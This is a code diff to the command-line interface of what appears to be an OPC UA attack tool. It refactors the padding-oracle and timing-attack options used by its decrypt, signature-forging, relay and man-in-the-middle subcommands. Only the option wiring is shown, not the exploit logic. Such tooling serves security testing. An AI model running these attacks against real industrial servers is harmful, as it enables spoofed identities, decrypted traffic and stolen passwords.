@@ -42,6 +42,15 @@ class Attack(ABC):
     """Executes the attack, given specified options."""
     ...
     
+def add_padding_oracle_args(aparser : ArgumentParser):
+  """Adds arguments to configure a padding oracle attack"""
+  aparser.add_argument('-t', '--padding-oracle-type', choices=('opn', 'password', 'try-both'), default='try-both',
+    help='which PKCS#1 padding oracle to use with --bypass-opn; default: try-both')
+  aparser.add_argument('-T', '--timing-attack-threshold', type=float, metavar='INTERVAL', default=0,
+    help='if set, will try a timing-based padding oracle with this threshold parameter (fractional; in seconds); use check -t to help determine this')
+  aparser.add_argument('-C', '--timing-attack-expansion', type=int, metavar='COUNT', default=50,
+    help='when used alongside -T this determines the ciphertext expansion parameter; default: 50')
+    
 class CheckAttack(Attack):
   subcommand = 'check'
   short_help = 'evaluate whether attacks apply to server'
@@ -54,6 +63,8 @@ attacks are worth trying.
 By default, this will be non-intrusive and only request and endpoint list. With 
 --probe-password and --test-timing-attack you can enable nosier checks that may
 yield additional results.
+
+Most important results are printed to stdout. Rest to stderr.
 """
 
   def add_arguments(self, aparser):
@@ -105,10 +116,7 @@ will try to maximize).
       help='when no HTTPS is available, attempt to use sigforge and decrypt attacks to bypass the opc.tcp secure channel handshake')
     aparser.add_argument('-c', '--cache-file', type=Path, default='.spoofed-opnreqs.json',
       help='file in which to cache OPN requests with spoofed signatures; default: .opncache.json')
-    aparser.add_argument('-t', '--padding-oracle-type', choices=('opn', 'password', 'try-both'), default='try-both',
-      help='which PKCS#1 padding oracle to use with --bypass-opn; default: try-both')
-    aparser.add_argument('-T', '--timing-attack-threshold', type=float, default=0,
-      help='if set together with --bypass-opn, will try a timing-based padding oracle with this threshold parameter (fractional; in seconds)')
+    add_padding_oracle_args(aparser.add_argument_group('padding oracle parameters', '(applicable if --bypass-opn is set)'))
     
     aparser.add_argument('url',
       help='Target server OPC URL (either opc.tcp:// or https:// protocol)',
@@ -121,7 +129,8 @@ will try to maximize).
       args.bypass_opn and args.padding_oracle_type != 'password', 
       args.bypass_opn and args.padding_oracle_type != 'opn', 
       args.cache_file,
-      args.timing_attack_threshold
+      args.timing_attack_threshold,
+      args.timing_attack_expansion
     )
     
 class RelayAttack(Attack):
@@ -142,9 +151,7 @@ information.
       help='when no HTTPS is available on either or both servers, attempt to use sigforge and decrypt attacks to bypass the opc.tcp secure channel handshake')
     aparser.add_argument('-r', '--reusable-opn-file', type=Path, default='.spoofed-opnreqs.json',
       help='file in which to cache OPN requests with spoofed signatures; default: .spoofed-opnreqs.json')
-    aparser.add_argument('-t', '--padding-oracle-type', choices=('opn', 'password', 'try-both'),
-      help='which PKCS#1 padding oracle to use with --bypass-opn; default: try-both')
-    
+    add_padding_oracle_args(aparser.add_argument_group('padding oracle parameters', 'applicable if --bypass-opn is set'))
     
     aparser.add_argument('server-a', 
       help='OPC URL of the server of which to spoof the identity', 
@@ -244,14 +251,11 @@ to grab a password payload.
 """.strip()
   
   def add_arguments(self, aparser):
-    aparser.add_argument('-t', '--padding-oracle-type', choices=('opn', 'password', 'try-both'), default='try-both',
-      help='which PKCS#1 padding oracle to use; default: try-both')
     aparser.add_argument('url', type=str,
       help='endpoint URL of the OPC UA server owning the RSA key pair the ciphertext was produced for')
     aparser.add_argument('ciphertext', type=str,
       help='hex-encoded RSA-encrypted ciphertext; either OAEP or PKCS#1')
-    aparser.add_argument('-T', '--timing-attack-threshold', type=float, default=0,
-      help='if set, will also try a timing-based padding oracle with this threshold parameter (fractional; in seconds)')
+    add_padding_oracle_args(aparser)
     
   def execute(self, args):
     opn, password = {
@@ -259,7 +263,7 @@ to grab a password payload.
       'password': (False, True),
       'try-both': (True,  True),
     }[args.padding_oracle_type]
-    decrypt_attack(args.url, unhexlify(args.ciphertext), opn, password, args.timing_attack_threshold)
+    decrypt_attack(args.url, unhexlify(args.ciphertext), opn, password, args.timing_attack_threshold, args.timing_attack_expansion)
   
 
 class SigForgeAttack(Attack):
@@ -279,12 +283,9 @@ to show the concept in isolation or perform some follow-up attack.
 """.strip()
   
   def add_arguments(self, aparser):
-    aparser.add_argument('-t', '--padding-oracle-type', choices=('opn', 'password', 'try-both'), default='try-both',
-      help='which PKCS#1 padding oracle to use; default: try-both')
     aparser.add_argument('-H', '--hash-function', choices=('sha1', 'sha256'), default='sha256',
       help='hash function to use in signature computation; default: sha256')
-    aparser.add_argument('-T', '--timing-attack-threshold', type=float, default=0,
-      help='if set, will also try a timing-based padding oracle with this threshold parameter (fractional; in seconds)')
+    add_padding_oracle_args(aparser)
     aparser.add_argument('url', type=str,
       help='endpoint URL of the OPC UA server whose private key to spoof a signature with')
     aparser.add_argument('payload', type=str, 
@@ -296,7 +297,7 @@ to show the concept in isolation or perform some follow-up attack.
       'password': (False, True),
       'try-both': (True,  True),
     }[args.padding_oracle_type]
-    forge_signature_attack(args.url, unhexlify(args.payload), opn, password, SecurityPolicy.BASIC128RSA15 if args.hash_function == 'sha1' else SecurityPolicy.BASIC256, args.timing_attack_threshold)
+    forge_signature_attack(args.url, unhexlify(args.payload), opn, password, SecurityPolicy.BASIC128RSA15 if args.hash_function == 'sha1' else SecurityPolicy.BASIC256, args.timing_attack_threshold, args.timing_attack_expansion)
 
 class MitMAttack(Attack):
   subcommand = 'mitm'
